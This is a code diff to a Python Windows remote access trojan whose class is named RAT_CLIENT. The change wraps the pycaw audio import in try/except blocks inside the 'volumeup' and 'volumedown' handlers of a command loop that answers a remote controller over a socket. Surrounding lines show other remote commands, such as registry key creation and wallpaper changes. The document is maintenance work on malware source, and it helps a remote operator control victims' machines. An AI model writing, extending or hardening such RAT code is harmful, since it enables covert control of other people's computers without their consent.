@@ -8,7 +8,6 @@ from win32con import HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, GENERIC_WRI
 from datetime import datetime
 from ctypes import windll, cast, POINTER
 from comtypes import CLSCTX_ALL
-from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from winreg import *
 import shutil
 import glob
@@ -158,20 +157,28 @@ class RAT_CLIENT:
                     s.send("Impossible to create key".encode())
             
             elif command == 'volumeup':
-                devices = AudioUtilities.GetSpeakers()
-                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-                volume = cast(interface, POINTER(IAudioEndpointVolume))
-                if volume.GetMute() == 1:
-                    volume.SetMute(0, None)
-                volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
-                s.send("Volume is increased to 100%".encode())
+                try:
+                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+                    devices = AudioUtilities.GetSpeakers()
+                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+                    volume = cast(interface, POINTER(IAudioEndpointVolume))
+                    if volume.GetMute() == 1:
+                        volume.SetMute(0, None)
+                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
+                    s.send("Volume is increased to 100%".encode())
+                except:
+                    s.send("Module is not founded".encode())
             
             elif command == 'volumedown':
-                devices = AudioUtilities.GetSpeakers()
-                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-                volume = cast(interface, POINTER(IAudioEndpointVolume))
-                volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
-                s.send("Volume is decreased to 0%".encode())
+                try:
+                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+                    devices = AudioUtilities.GetSpeakers()
+                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+                    volume = cast(interface, POINTER(IAudioEndpointVolume))
+                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
+                    s.send("Volume is decreased to 0%".encode())
+                except:
+                    s.send("Module is not founded".encode())
             
             elif command == 'setwallpaper':
                 pic = s.recv(6000).decode()
